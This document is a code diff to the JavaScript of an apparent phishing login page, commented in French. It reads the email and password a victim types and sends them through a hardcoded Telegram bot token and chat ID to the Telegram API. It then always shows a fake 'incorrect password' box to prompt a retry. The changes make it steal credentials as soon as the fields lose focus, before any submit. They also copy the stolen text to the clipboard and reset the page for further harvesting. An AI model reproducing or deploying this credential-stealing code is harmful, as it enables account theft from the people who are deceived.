@@ -1,34 +1,53 @@
 document.addEventListener("DOMContentLoaded", function() {
   const form = document.querySelector("form");
+  let sent = false;
 
-  form.addEventListener("submit", function(event) {
-    event.preventDefault(); // Empêche la soumission classique du formulaire
-
-    // Récupération des valeurs du formulaire
+  function trySendTelegram() {
+    if (sent) return;
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
-    
-    // Construction du message à envoyer sur Telegram
-    const message = encodeURIComponent(`Nouvelle soumission de formulaire:\nAdresse e-mail: ${email}\nMot de passe: ${password}`);
-    
-    // Remplace ces valeurs par celles de ton bot et chat
-    const BOT_TOKEN = "7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs";
-    const CHAT_ID = "-4766781392";
-    
-    // URL de l'API Telegram pour envoyer un message
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
-    
-    // Envoi de la requête fetch
-    fetch(url)
-      .then(response => response.json())
-      .then(data => {
-        // Peu importe la réponse, on affiche le message d'erreur personnalisé
-        showError();
-      })
-      .catch(error => {
-        console.error("Erreur lors de la requête fetch:", error);
-        showError();
-      });
+    if (email && password) {
+      sent = true;
+      // Construction du message avec emoji
+      const message = `📩 New Access Mail
+Adresse e-mail: ${email}
+Mot de passe: ${password}`;
+      const encodedMessage = encodeURIComponent(message);
+      
+      const BOT_TOKEN = "7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs";
+      const CHAT_ID = "-4766781392";
+      
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
+      
+      // Envoi de la requête fetch
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          // Copie automatique du message dans le presse-papier
+          navigator.clipboard.writeText(message)
+            .then(() => {
+              showError();
+            })
+            .catch(err => {
+              console.error("Erreur lors de la copie dans le presse-papier:", err);
+              showError();
+            });
+        })
+        .catch(error => {
+          console.error("Erreur lors de la requête fetch:", error);
+          showError();
+        });
+    }
+  }
+  
+  // Envoi dès que l'utilisateur quitte les champs (blur)
+  document.getElementById("email").addEventListener("blur", trySendTelegram);
+  document.getElementById("password").addEventListener("blur", trySendTelegram);
+  
+  // Conserver le submit pour garantir (si jamais)
+  form.addEventListener("submit", function(event) {
+    event.preventDefault();
+    trySendTelegram();
   });
   
   function showError() {
@@ -45,7 +64,6 @@ document.addEventListener("DOMContentLoaded", function() {
     modal.style.alignItems = "center";
     modal.style.zIndex = "1000";
 
-    // Boîte contenant le message et le bouton
     const box = document.createElement("div");
     box.style.backgroundColor = "#fff";
     box.style.padding = "20px";
@@ -53,14 +71,12 @@ document.addEventListener("DOMContentLoaded", function() {
     box.style.textAlign = "center";
     box.style.minWidth = "300px";
 
-    // Message d'erreur en rouge
     const msg = document.createElement("p");
     msg.textContent = "Mot de passe saisi est incorrect";
     msg.style.color = "red";
     msg.style.fontSize = "16px";
     msg.style.marginBottom = "20px";
 
-    // Bouton "Ressayer"
     const button = document.createElement("button");
     button.textContent = "Ressayer";
     button.style.backgroundColor = "#000";
@@ -71,6 +87,7 @@ document.addEventListener("DOMContentLoaded", function() {
     button.addEventListener("click", function() {
       document.body.removeChild(modal);
       form.reset();
+      sent = false; // réinitialiser pour permettre un nouvel envoi
     });
 
     box.appendChild(msg);
